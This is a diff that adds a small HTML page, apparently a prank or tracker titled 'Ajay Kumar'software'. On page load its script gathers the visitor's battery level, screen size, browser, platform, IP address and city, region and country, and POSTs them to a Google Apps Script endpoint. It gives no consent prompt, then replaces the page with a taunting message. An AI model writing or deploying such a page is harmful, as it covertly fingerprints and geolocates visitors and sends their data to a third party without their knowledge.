@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ajay Kumar'software </title>
+</head>
+<body>
+  <h2>just a minute you can see our all details...</h2>
+  <script>
+    async function getInfo() {
+      try {
+        const battery = await navigator.getBattery();
+        const screenWidth = screen.width;
+        const screenHeight = screen.height;
+        const userAgent = navigator.userAgent;
+        const browser = navigator.appVersion;
+        const os = navigator.platform;
+
+        const ipRes = await fetch("https://ipapi.co/json");
+        const ipData = await ipRes.json();
+
+        const payload = {
+          battery: battery.level * 100 + "%",
+          screen: screenWidth + "x" + screenHeight,
+          browser: browser,
+          device: userAgent,
+          os: os,
+          ip: ipData.ip,
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country_name
+        };
+
+        const scriptURL = "https://script.google.com/macros/s/AKfycbwG0tDgBKfxv3LKqMF-NfnqwJnAoBsxU7ESOLE1C7UWKiQMAgjsMv2UJq_h2HIMfbVTMQ/exec";
+
+        await fetch(scriptURL, {
+          method: 'POST',
+          mode: 'no-cors',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        document.body.innerHTML = "<h2>bye bye tata hame jada kuch bolna nhi aata hai</h2>";
+      } catch (e) {
+        document.body.innerHTML = "<h2>Error occurred. Try again.</h2>";
+      }
+    }
+
+    getInfo();
+  </script>
+</body>
+</html>
